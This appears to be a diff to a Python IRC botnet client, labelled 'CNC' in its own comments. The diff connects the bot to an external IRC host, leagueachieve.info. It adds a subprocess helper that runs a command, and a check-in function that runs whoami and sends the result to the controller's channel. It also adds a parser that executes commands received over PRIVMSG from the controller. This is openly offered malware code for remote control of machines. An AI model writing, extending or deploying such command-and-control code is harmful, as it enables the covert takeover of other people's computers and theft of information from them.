@@ -13,14 +13,22 @@ import random
 import time
 import platform
 import os
+import subprocess as sub
 
 #IRC Settings
-server = "server"
-channel = "#cnc"
-botnick = "cncnick"
+server = "leagueachieve.info"
+channel = "#lobby"
+botnick = "bot1"
+
+def execute(cmd):
+	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
+	output, errors = p.communicate()
+	output = output.strip()
+	return output
 
 def iAmHere(): #send back to IRC server that you are here
-	print "'iAmHere' function not yet implemented"
+	info = execute("whoami")	
+	irc.send('PRIVMSG ' + channel + " :" + str(info) + '\r\n')
 
 def iAmGood(): #send back to IRC server that you are good
 	print "'iAmGood' function not yet implemented"
@@ -34,13 +42,20 @@ commands = {
 #function which parses the command and determine how to handle it
 def parseCommand(command):
 	#have to actually parse the text and find the command.
-	print "in the parseCommand function"
-	print "arg is '%s'" % command
-	# print "calling appropriate function..."
-	# commands[command]()
-	# print "function called"
-
-
+	arg = "PRIVMSG"
+	if (arg in command):
+		indexVal = command.index(arg);
+		tempCommand = command[indexVal:]
+		indexVal = (tempCommand.index(':') + 1)
+		finalCommand = tempCommand[indexVal:]	
+		command = finalCommand.strip()
+		
+		#making it lowercase
+		command = command.lower()
+		
+		print "Recieved %s from the CNC" % command
+		commands[command]()
+		print "function called"
 
 
 #THIS SECTION IS FOR CONNECTION TO THE SERVER
